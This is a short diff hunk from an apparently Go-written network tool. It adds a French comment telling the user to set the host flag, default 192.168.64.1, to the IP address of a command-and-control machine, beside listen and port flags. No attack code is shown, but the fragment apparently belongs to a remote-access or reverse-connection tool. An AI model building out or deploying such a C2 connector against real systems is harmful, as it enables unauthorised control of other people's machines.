@@ -11,7 +11,8 @@ import (
 
 var (
     listen = flag.Bool("l", false, "Listen")
-    
+
+    //modifier l'adresse ip ci-dessous par l'adresse ip de la machine command and control
     host   = flag.String("h", "192.168.64.1", "Host")
 
     port = flag.Int("p", 0, "Port")
